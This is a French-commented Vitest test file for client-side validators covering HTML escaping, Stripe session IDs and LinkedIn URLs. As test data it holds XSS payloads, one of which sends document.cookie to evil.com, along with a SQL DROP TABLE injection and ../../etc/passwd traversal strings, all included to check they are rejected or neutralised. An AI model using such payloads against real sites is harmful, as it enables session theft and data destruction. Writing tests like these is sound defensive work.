import { describe, it, expect } from 'vitest';
import {
  escapeHtml,
  isValidSessionId,
  truncateSessionId,
  isValidLinkedInUrl,
} from './client-validators.js';

// ═══════════════════════════════════════════════════════════════════════════
// escapeHtml — protection XSS
// ═══════════════════════════════════════════════════════════════════════════

describe('escapeHtml', () => {
  it('échappe le caractère & en &amp;', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b');
  });

  it('échappe < en &lt;', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
  });

  it('échappe > en &gt;', () => {
    expect(escapeHtml('a > b')).toBe('a &gt; b');
  });

  it('échappe les guillemets doubles en &quot;', () => {
    expect(escapeHtml('"hello"')).toBe('&quot;hello&quot;');
  });

  it("échappe les guillemets simples en &#x27;", () => {
    expect(escapeHtml("it's")).toBe("it&#x27;s");
  });

  it('échappe le slash en &#x2F;', () => {
    expect(escapeHtml('</script>')).toBe('&lt;&#x2F;script&gt;');
  });

  it('neutralise une payload XSS classique <img onerror>', () => {
    const payload = '<img src=x onerror="alert(1)">';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<img');
    expect(escaped).not.toContain('onerror');
    expect(escaped).toBe('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
  });

  it('neutralise une payload XSS avec balise script', () => {
    const payload = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('neutralise une injection javascript: dans une URL', () => {
    const payload = 'javascript:alert(document.cookie)';
    const escaped = escapeHtml(payload);
    // Le slash est échappé, rendant le protocole inutilisable comme href
    expect(escaped).toContain('&#x2F;');
  });

  it('neutralise une payload SVG onload XSS', () => {
    const payload = "<svg onload='alert(1)'>";
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<svg');
    expect(escaped).toContain('&lt;svg');
  });

  it('neutralise une injection de template {{7*7}}', () => {
    // Non-HTML mais vérifie que les chars spéciaux autour ne passent pas
    const payload = '{{7*7}}<b>injected</b>';
    const escaped = escapeHtml(payload);
    expect(escaped).toContain('&lt;b&gt;');
  });

  it("n'altère pas une chaîne sans caractères spéciaux", () => {
    expect(escapeHtml('Hello World 123')).toBe('Hello World 123');
  });

  it('convertit les non-string en string avant échappement', () => {
    expect(escapeHtml(42)).toBe('42');
    expect(escapeHtml(null)).toBe('null');
    expect(escapeHtml(undefined)).toBe('undefined');
  });

  it('gère une chaîne vide', () => {
    expect(escapeHtml('')).toBe('');
  });

  it("échappe & en premier pour ne pas double-échapper les entités", () => {
    // Si & était échappé après <, on obtiendrait &amp;lt; — incorrect
    const result = escapeHtml('a < b & c > d');
    expect(result).toBe('a &lt; b &amp; c &gt; d');
    expect(result).not.toContain('&amp;lt;');
    expect(result).not.toContain('&amp;gt;');
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// isValidSessionId — validation des session_id Stripe
// ═══════════════════════════════════════════════════════════════════════════

describe('isValidSessionId', () => {
  const validLive = 'cs_live_abcdefghijklmnopqrstuvwxyz1234567890';
  const validTest = 'cs_test_abcdefghijklmnopqrstuvwxyz1234567890';

  it('accepte un session_id cs_live_ valide', () => {
    expect(isValidSessionId(validLive)).toBe(true);
  });

  it('accepte un session_id cs_test_ valide', () => {
    expect(isValidSessionId(validTest)).toBe(true);
  });

  it('accepte un session_id avec underscores et tirets', () => {
    expect(isValidSessionId('cs_test_abc-def_ghi-jkl_1234567890')).toBe(true);
  });

  it('rejette un session_id sans préfixe reconnu', () => {
    expect(isValidSessionId('pi_live_abcdefghijklmnop12345678')).toBe(false);
  });

  it('rejette une chaîne trop courte (< 20 chars)', () => {
    expect(isValidSessionId('cs_test_short')).toBe(false);
  });

  it('rejette une chaîne trop longue (> 256 chars)', () => {
    const tooLong = 'cs_test_' + 'a'.repeat(250);
    expect(isValidSessionId(tooLong)).toBe(false);
  });

  it('rejette un session_id avec des espaces', () => {
    expect(isValidSessionId('cs_live_abc def ghi jkl mno pqr')).toBe(false);
  });

  it('rejette un session_id avec des caractères spéciaux XSS', () => {
    expect(isValidSessionId('cs_test_<script>alert(1)</script>xxx')).toBe(false);
  });

  it('rejette un session_id avec des guillemets', () => {
    expect(isValidSessionId('cs_test_abc"onmouseover="alert(1)')).toBe(false);
  });

  it('rejette null', () => {
    expect(isValidSessionId(null)).toBe(false);
  });

  it('rejette undefined', () => {
    expect(isValidSessionId(undefined)).toBe(false);
  });

  it('rejette un nombre', () => {
    expect(isValidSessionId(12345678901234567890)).toBe(false);
  });

  it('rejette un objet', () => {
    expect(isValidSessionId({ id: 'cs_test_abc' })).toBe(false);
  });

  it('rejette une chaîne vide', () => {
    expect(isValidSessionId('')).toBe(false);
  });

  it('rejette une injection SQL dans le format Stripe', () => {
    expect(isValidSessionId("cs_test_'; DROP TABLE sessions; --xxxx")).toBe(false);
  });

  it('rejette un path traversal déguisé', () => {
    expect(isValidSessionId('cs_test_../../etc/passwd/xxxxxxxxxxx')).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// truncateSessionId
// ═══════════════════════════════════════════════════════════════════════════

describe('truncateSessionId', () => {
  it('tronque un long session_id avec ellipse', () => {
    const id = 'cs_test_abcdefghijklmnopqrstuvwxyz';
    const result = truncateSessionId(id);
    expect(result).toContain('…');
    expect(result.length).toBeLessThan(id.length);
  });

  it('conserve les 12 premiers et 4 derniers caractères', () => {
    const id = 'cs_test_abcdefghijklmnopqrstuvwxyz';
    const result = truncateSessionId(id);
    expect(result.startsWith(id.slice(0, 12))).toBe(true);
    expect(result.endsWith(id.slice(-4))).toBe(true);
  });

  it("ne tronque pas une chaîne de 16 caractères ou moins", () => {
    const short = 'cs_test_abcde12';
    expect(truncateSessionId(short)).toBe(short);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// isValidLinkedInUrl — validation des URLs LinkedIn (vecteur XSS primaire)
// ═══════════════════════════════════════════════════════════════════════════

describe('isValidLinkedInUrl', () => {
  it('accepte une URL LinkedIn standard', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/john-doe')).toBe(true);
  });

  it('accepte une URL LinkedIn avec chiffres et underscores', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/john_doe123')).toBe(true);
  });

  it('accepte une URL LinkedIn avec slash final', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/john-doe/')).toBe(true);
  });

  it('rejette http:// (non HTTPS)', () => {
    expect(isValidLinkedInUrl('http://www.linkedin.com/in/john-doe')).toBe(false);
  });

  it('rejette un domaine différent de linkedin.com', () => {
    expect(isValidLinkedInUrl('https://www.evil.com/in/john-doe')).toBe(false);
  });

  it('rejette une URL sans le préfixe /in/', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/pub/john-doe')).toBe(false);
  });

  it('rejette une payload XSS javascript:', () => {
    expect(isValidLinkedInUrl('javascript:alert(document.cookie)')).toBe(false);
  });

  it('rejette une injection HTML dans l\'URL', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/<script>alert(1)</script>')).toBe(false);
  });

  it('rejette un URL avec des espaces', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/john doe')).toBe(false);
  });

  it('rejette une URL trop longue', () => {
    const slug = 'a'.repeat(500);
    expect(isValidLinkedInUrl(`https://www.linkedin.com/in/${slug}`)).toBe(false);
  });

  it('rejette null', () => {
    expect(isValidLinkedInUrl(null)).toBe(false);
  });

  it('rejette une chaîne vide', () => {
    expect(isValidLinkedInUrl('')).toBe(false);
  });

  it('rejette une tentative de path traversal', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/../../etc/passwd')).toBe(false);
  });

  it('rejette une injection de query string', () => {
    expect(isValidLinkedInUrl('https://www.linkedin.com/in/john-doe?redirect=evil.com')).toBe(false);
  });
});